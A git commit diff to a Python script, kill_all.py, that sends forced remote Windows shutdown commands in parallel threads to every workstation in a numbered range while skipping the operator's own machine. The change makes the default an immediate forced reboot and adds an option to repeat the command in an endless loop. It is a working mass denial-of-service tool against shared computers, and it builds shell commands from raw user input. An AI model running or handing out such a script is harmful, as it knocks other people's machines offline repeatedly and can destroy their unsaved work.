3b6ca40319ce09aef879a2831e063a503de85e00
Warren Hood <nullbyte001@gmail.com>
2018-10-29 13:17:26 +0200

    Add files via upload

--- kill_all.py
+++ kill_all.py
@@ -8,8 +8,9 @@ OWN_BASE = int(input().strip())-1
 OWN_WS = -1
 if OWN_BASE > -1:
     OWN_WS = int(input("Enter your Workstation number: "))
-params = "/s /p /f"
-user_params = input("Enter shutdown params(default: /s /p /f): ").strip()
+params = "/r /f /t 0"
+user_params = input("Enter shutdown params(default: /r /f /t 0): ").strip()
+LOOP_FOREVER = input("Loop forever?(y/n)").strip().lower()[0] == "y"
 if len(user_params) > 0:
     params = user_params
 def pad_if_1(n):
@@ -17,8 +18,10 @@ def pad_if_1(n):
         return "0"+str(n)
     else:
         return str(n)
-def shutdown(ws,params):
-    os.system("shutdown "+params+" /m \\\\"+ws)
+def shutdown(ws,params,loop=False):
+    os.system("@echo off & shutdown "+params+" /m \\\\"+ws)
+    while loop:
+        os.system("@echo off & shutdown "+params+" /m \\\\"+ws)
 for base in BASE_NAMES:
     for ws_id in range(MIN_NUM,MAX_NUM+1,1):
         ws_name = base+pad_if_1(ws_id)
@@ -27,5 +30,7 @@ for base in BASE_NAMES:
             continue
         print("\nTarget:",ws_name)
         print("Executing shutdown with params:",params)
-        threading.Thread(target=shutdown,args=(ws_name,params)).start()
+        if LOOP_FOREVER:
+            print("Looping...")
+        threading.Thread(target=shutdown,args=(ws_name,params,LOOP_FOREVER)).start()
     
